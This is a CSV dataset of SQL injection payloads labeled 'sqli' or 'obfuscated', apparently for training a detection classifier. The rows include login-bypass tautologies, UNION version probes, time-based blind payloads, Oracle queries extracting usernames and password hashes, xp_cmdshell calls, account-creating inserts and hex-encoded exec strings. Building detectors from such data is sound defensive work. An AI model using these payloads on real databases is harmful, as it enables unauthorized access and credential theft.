query,label,source,label_name
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,kaggle_sqli,sqli
or 1  =  1 or ''  =  ',1,kaggle_sqli,sqli
select * from users where id  =  1   or 1  =  1 -- 1,1,kaggle_sqli,sqli
or 'text' > 't',1,kaggle_sqli,sqli
"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",1,kaggle_sqli,sqli
admin' or '1'  =  '1'#,1,kaggle_sqli,sqli
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,1,kaggle_sqli,sqli
s,1,kaggle_sqli,sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,kaggle_sqli,sqli
 select * from information_schema.tables--,1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
1   )    )    or pg_sleep  (  __TIME__  )  --,1,kaggle_sqli,sqli
" select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",1,kaggle_sqli,sqli
declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,2,kaggle_sqli,obfuscated
 or 1  =  1 or ''  =  ',1,kaggle_sqli,sqli
select * from users where id  =  1 %!<1 or 1  =  1 -- 1,1,kaggle_sqli,sqli
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,2,kaggle_sqli,obfuscated
" select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",1,kaggle_sqli,sqli
or 'unusual'   =   'unusual',1,kaggle_sqli,sqli
 or 1 in   (  select @@version  )  --,1,kaggle_sqli,sqli
truncate,1,kaggle_sqli,sqli
as,1,kaggle_sqli,sqli
 or 3  =  3 --,1,kaggle_sqli,sqli
" select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",1,kaggle_sqli,sqli
"admin""  )   or   (  ""1""  =  ""1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",1,kaggle_sqli,sqli
"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,kaggle_sqli,sqli
" select * from users where id  =  1 union select .1_,version  (    )   -- 1",1,kaggle_sqli,sqli
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,1,kaggle_sqli,sqli
" or 0  =  0 #""",1,kaggle_sqli,sqli
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,1,kaggle_sqli,sqli
select * from users where id  =  1 %!<@ or 1  =  1 -- 1,1,kaggle_sqli,sqli
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",1,kaggle_sqli,sqli
1  )   or sleep  (  __TIME__  )  #,1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",1,kaggle_sqli,sqli
select * from users where id  =  1. <@ or 1  =  1 -- 1,1,kaggle_sqli,sqli
 or true--,1,kaggle_sqli,sqli
; execute immediate 'sel' || 'ect us' || 'er',1,kaggle_sqli,sqli
hi' or 'x'  =  'x';,1,kaggle_sqli,sqli
select * from users where id  =  1 <@ or 1  =  1 -- 1,1,kaggle_sqli,sqli
" select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
admin' #,1,kaggle_sqli,sqli
" select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1,kaggle_sqli,sqli
"""  )  ;waitfor delay '0:0:__TIME__'--",1,kaggle_sqli,sqli
 or 'unusual'   =   'unusual',1,kaggle_sqli,sqli
"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",1,kaggle_sqli,sqli
"admin"" or ""1""  =  ""1""/*",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1",1,kaggle_sqli,sqli
like,1,kaggle_sqli,sqli
or username like char  (  37  )  ;,2,kaggle_sqli,obfuscated
 )    )    or pg_sleep  (  __TIME__  )  --,1,kaggle_sqli,sqli
select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,1,kaggle_sqli,sqli
or 3  =  3,1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",1,kaggle_sqli,sqli
select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,1,kaggle_sqli,sqli
exec sp,1,kaggle_sqli,sqli
" select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",1,kaggle_sqli,sqli
select * from users where id  =  1 or \<$ or 1  =  1 -- 1,1,kaggle_sqli,sqli
" select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",1,kaggle_sqli,sqli
admin' or 1  =  1/*,1,kaggle_sqli,sqli
a' waitfor delay '0:0:10'--,1,kaggle_sqli,sqli
" select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 union select .1$_,version  (    )   -- 1",1,kaggle_sqli,sqli
and 1 in   (  select var from temp  )  --,1,kaggle_sqli,sqli
hi'  )   or   (  'a'  =  'a,1,kaggle_sqli,sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,kaggle_sqli,sqli
"admin"" or 1  =  1",1,kaggle_sqli,sqli
"""  )   or true--",1,kaggle_sqli,sqli
" select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
1  )   or pg_sleep  (  __TIME__  )  --,1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",1,kaggle_sqli,sqli
"""  )   or sleep  (  __TIME__  )    =  """,1,kaggle_sqli,sqli
select * from users where id  =  1.<@. or 1  =  1 -- 1,1,kaggle_sqli,sqli
"admin""  )   or   (  ""1""  =  ""1""--",1,kaggle_sqli,sqli
" select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",1,kaggle_sqli,sqli
; exec xp_regread,1,kaggle_sqli,sqli
" select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1,kaggle_sqli,sqli
select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,1,kaggle_sqli,sqli
" select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
1 and 1  =  1,1,kaggle_sqli,sqli
or 0  =  0 #,1,kaggle_sqli,sqli
union select * from users where login   =   char ...,1,kaggle_sqli,sqli
" select * from users where id  =  1 union select 1||@,version  (    )   -- 1",1,kaggle_sqli,sqli
admin'  )   or '1'  =  '1'--,1,kaggle_sqli,sqli
1;SELECT *,1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
x' and 1  =    (  select count  (  *  )   from tabname  )  ; --,1,kaggle_sqli,sqli
" select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,kaggle_sqli,sqli
"1 or benchmark  (  10000000,MD5  (  1   )    )   #",1,kaggle_sqli,sqli
procedure,1,kaggle_sqli,sqli
or ''  =  ',1,kaggle_sqli,sqli
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,1,kaggle_sqli,sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,kaggle_sqli,sqli
\'; desc users; --,1,kaggle_sqli,sqli
" select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",1,kaggle_sqli,sqli
select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',1,kaggle_sqli,sqli
""" or """"^""",1,kaggle_sqli,sqli
"""-""",1,kaggle_sqli,sqli
" select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 *\ union select null,@@VERSION -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",1,kaggle_sqli,sqli
" select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
admin'/*,1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
||UTL_HTTP.REQUEST,1,kaggle_sqli,sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,kaggle_sqli,sqli
" select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",1,kaggle_sqli,sqli
"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1,kaggle_sqli,sqli
" select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",1,kaggle_sqli,sqli
select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',1,kaggle_sqli,sqli
1 uni/**/on select all from where,1,kaggle_sqli,sqli
" select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",1,kaggle_sqli,sqli
admin'  )   or '1'  =  '1'#,1,kaggle_sqli,sqli
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1,kaggle_sqli,sqli
or '7659'  =  '7659,1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 union select +!<1,version  (    )   -- 1",1,kaggle_sqli,sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
or true--,1,kaggle_sqli,sqli
" select * from users where id  =  1 union select !<1,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  '1' union select \#,@@VERSION -- 1'",1,kaggle_sqli,sqli
" select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",1,kaggle_sqli,sqli
""" or true--",1,kaggle_sqli,sqli
select * from users where id  =  1. or 1  =  1 -- 1,1,kaggle_sqli,sqli
" select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
â or 3  =  3 --,1,kaggle_sqli,sqli
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,1,kaggle_sqli,sqli
" select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
 or uid like '%,1,kaggle_sqli,sqli
select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',1,kaggle_sqli,sqli
" select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",1,kaggle_sqli,sqli
23 or 1  =  1; --,1,kaggle_sqli,sqli
" select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,1,kaggle_sqli,sqli
" select * from users where id  =  '1' union select \,@@VERSION -- 1'",1,kaggle_sqli,sqli
0 or 1  =  1,1,kaggle_sqli,sqli
select * from users where id  =  1 &@ or 1  =  1 -- 1,1,kaggle_sqli,sqli
"admin""  )   or ""1""  =  ""1",1,kaggle_sqli,sqli
select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,kaggle_sqli,sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,kaggle_sqli,sqli
&apos; OR,1,kaggle_sqli,sqli
sqlvuln;,1,kaggle_sqli,sqli
select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,1,kaggle_sqli,sqli
select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',1,kaggle_sqli,sqli
""" or """"*""",1,kaggle_sqli,sqli
"hi or 1  =  1 --""",1,kaggle_sqli,sqli
" select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",1,kaggle_sqli,sqli
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1,kaggle_sqli,sqli
" select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,kaggle_sqli,sqli
" select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",1,kaggle_sqli,sqli
select * from information_schema.tables--,1,kaggle_sqli,sqli
select * from users where id  =  1 or \<\. or 1  =  1 -- 1,1,kaggle_sqli,sqli
   (  select top 1,1,kaggle_sqli,sqli
Ã½ or 1  =  1 --,1,kaggle_sqli,sqli
a' --,1,kaggle_sqli,sqli
 or 1  =  1 /*,1,kaggle_sqli,sqli
" select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",1,kaggle_sqli,sqli
--,1,kaggle_sqli,sqli
"exec sp_addlogin 'name' , 'password'",1,kaggle_sqli,sqli
" select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",1,kaggle_sqli,sqli
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,2,kaggle_sqli,obfuscated
" select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",1,kaggle_sqli,sqli
group by userid having 1  =  1--,1,kaggle_sqli,sqli
" select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1",1,kaggle_sqli,sqli
select * from users where id  =  1 *1 or 1  =  1 -- 1,1,kaggle_sqli,sqli
" select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",1,kaggle_sqli,sqli
‘ or 1  =  1 --,1,kaggle_sqli,sqli
" select * from users where id  =  1 *\. union select null,@@VERSION -- 1",1,kaggle_sqli,sqli
select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,1,kaggle_sqli,sqli
or 'a'  =  'a,1,kaggle_sqli,sqli
declare @s varchar  (  22  )   select @s   = ,2,kaggle_sqli,obfuscated
" select * from users where id  =  1 union select 1<@,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",1,kaggle_sqli,sqli
@variable,1,kaggle_sqli,sqli
; exec master..xp_cmdshell,1,kaggle_sqli,sqli
select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,1,kaggle_sqli,sqli
" select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",1,kaggle_sqli,sqli
